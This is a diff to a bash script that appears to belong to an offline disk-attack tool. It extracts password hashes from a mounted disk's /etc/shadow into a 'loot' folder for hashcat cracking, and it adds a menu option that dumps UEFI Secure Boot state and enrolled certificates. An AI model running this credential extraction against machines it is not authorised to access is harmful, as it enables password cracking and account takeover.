@@ -39,7 +39,7 @@ function linux_hashcat_exp() {
     systemctl stop p3ng0s-cracker-watcher.path
     HASHES=$(grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2)
     [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
-    if grep -q '^\w+:\$y\$' /etc/shadow; then
+    if grep -q '^\w+:\$y\$' /mnt/etc/shadow; then
         MODE="28000" # Yescrypt
     else
         MODE="1800"  # SHA-512
@@ -209,20 +209,35 @@ function windows_exp() {
     sleep 1
 }
 
-function select_os() {
-    [ $? -ne 0 ] && $(sleep 4;exit -1)
-    OS_SEL=$(dialog --title "Select a operating system" \
-        --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
-        1 "Windows" \
-        2 "Linux" \
-        2>&1 >/dev/tty)
-    if [ $OS_SEL = 1 ]; then
-        hybernation_check
-        windows_exp
-    elif [ $OS_SEL = 2 ]; then
-        mount $PART /mnt
-        linux_exp
-    fi
+function efi_dump_mok_certs() {
+    [ ! -d $LOOT_FOLDER/uefi_data/ ] && mkdir -p $LOOT_FOLDER/uefi_data/
+    TMP_PWD=$(pwd)
+    cd $LOOT_FOLDER/uefi_data
+    echo "=== $(date) | $(dmidecode -s system-manufacturer) $(dmidecode -s system-product-name) ===" >> ./sb-state.txt
+    mokutil --sb-state >> ./sb-state.txt
+    mokutil --list-enrolled >> ./sb-state.txt
+    mokutil --export
+    cd $TMP_PWD
+}
+
+function uefi_exp() {
+    while true; do
+        SEL=$(dialog --title "What are you looking for?" \
+            --menu "...." 20 70 15 \
+            1 "r: Dump all the secure boot data :O" \
+            2>&1 >/dev/tty)
+        EXIT_STATUS=$?
+
+        if [ $EXIT_STATUS -ne 0 ]; then
+            echo "Exiting..."
+            break
+        fi
+
+        [ $SEL = 1 ] && efi_dump_mok_certs
+    done
+
+    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
+    sleep 1
 }
 
 function hybernation_check() {
@@ -254,6 +269,28 @@ function hybernation_check() {
         [ $SEL = 2 ] && $(ntfsfix -d "$PART" ; mount "$PART" /mnt)
     else
         mount $PART /mnt
+    fi
+}
+
+function select_os() {
+    # Not sure if i should delete this i dont remember if its needed or not test
+    # some other time
+    [ $? -ne 0 ] && $(sleep 4;exit -1)
+    OS_SEL=$(dialog --title "Select a operating system" \
+        --menu "Choose What kind of partition it is you mounted" 20 70 15 \
+        1 "Windows (ntfs)" \
+        2 "Linux (ext4)" \
+        3 "UEFI (vfat)" \
+        2>&1 >/dev/tty)
+    if [ $OS_SEL = 1 ]; then
+        hybernation_check
+        windows_exp
+    elif [ $OS_SEL = 2 ]; then
+        mount $PART /mnt
+        linux_exp
+    elif [ $OS_SEL = 3 ]; then
+        mount $PART /mnt
+        uefi_exp
     fi
 }
 
@@ -321,10 +358,11 @@ function encryption_check() {
 }
 
 function list_hard_drives() {
-    partitions=$(lsblk -npo NAME,SIZE --sort SIZE | tac)
+    partitions=$(lsblk -npo NAME,SIZE,FSTYPE --sort SIZE | tac)
     partition_options=()
-    while read -r name size; do
-        partition_options+=( "$name" "$name ($size)" )
+    while read -r name size fstype; do
+        fstype="${fstype:-unknown}"
+        partition_options+=( "$name" "$name ($size - $fstype)" )
     done <<< "$partitions"
     selected_partition=$(dialog --title "Select a Partition" \
                                  --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
